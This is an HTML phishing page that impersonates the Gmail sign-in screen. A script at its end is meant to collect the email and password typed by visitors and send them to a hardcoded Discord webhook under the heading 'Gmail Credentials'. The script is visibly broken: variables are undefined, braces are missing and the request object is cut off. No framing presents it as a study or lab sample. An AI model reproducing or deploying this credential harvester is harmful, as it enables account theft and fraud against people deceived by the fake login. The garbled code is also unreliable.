<!DOCTYPE html>
<html lang="en">
<head>

    <title>Gmail - Sign in</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Google Sans', Roboto, Arial, sans-serif; }
        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }

        .subtitle { text-align: center; font-size: 16px; color: #5f6368; margin-bottom: 32px; }
        .input-group { margin-bottom: 20px; position: relative; }
        .input-group input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; transition: border 0.2s; }
        .input-group input:focus { border-color: #1a73e8; border-width: 2px; }
        .input-group label { position: absolute; left: 15px; top: 13px; color: #5f6368; font-size: 16px; pointer-events: none; transition: 0.2s; background: #fff; padding: 0 4px; }
        .input-group input:focus + label, .input-group input:not(:placeholder-shown) + label { top: -8px; font-size: 12px; color: #1a73e8; }
        .password-options { display: flex; justify-content: space-between; align-items: center; margin: 10px 0 20px; font-size: 14px; }
        .password-options a { color: #1a73e8; text-decoration: none; }
        .password-options a:hover { text-decoration: underline; }
        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px; border-radius: 4px; font-size: 16px; font-weight: 500; width: 100%; cursor: pointer; transition: background 0.2s; }
        .btn:hover { background: #1765cc; }
        .footer { text-align: center; margin-top: 24px; font-size: 14px; color: #5f6368; }
        .footer a { color: #1a73e8; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
        .error { color: #d93025; font-size: 13px; margin: 8px 0; display: none; text-align: center; }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24" width="75" height="24">
            <path fill="#4285F4" d="M11.8 12.5L4.8 6.2v12.6l7-6.3z"/>

            <path fill="#EA4335" d="M70.2 0H2.4C1.1 0 0 1.1 0 2.4v2.4l4.8 3.2V4.8L11.8 0h58.4z"/>

    </div>
    <div class="title">Sign in</div>
    <div class="subtitle">to continue to Gmail</div>
    <form id="loginForm">
        <div class="input-group">
            <input type="email" id="email" name="email" placeholder=" " required>
            <label for="email">Email or phone</label>
        </div>
        <div class="input-group">
            <input type="password" id="password" name="password" placeholder=" " required>
            <label for="password">Password</label>
        </div>
        <div class="password-options">
            <a href="#" onclick="return false;">Forgot password?</a>
            <a href="#" onclick="return false;">Create account</a>
        </div>
        <div class="error" id="errorMsg">Incorrect email or password. Try again.</div>
        <button type="submit" class="btn">Next</button>
    </form>
    <div class="footer">
        English (United States) · <a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a>
    </div>
</div>
<script>
    // ===== Discord Webhook (hardcoded) =====
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1520406085511675974/904vxaGgyqXpdx3D9Uj7pVn_zJAcRfU7Rte7RZ3UTGPby3ff-QBIXzqqFuE_lB8bYrmX";

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();

        if (!email || !password) {
            document.getElementById('errorMsg').style.display = 'block';

            content: `**Gmail Credentials**\nEmail: ${email}\nPassword: ${password}`,

</script>
</body>
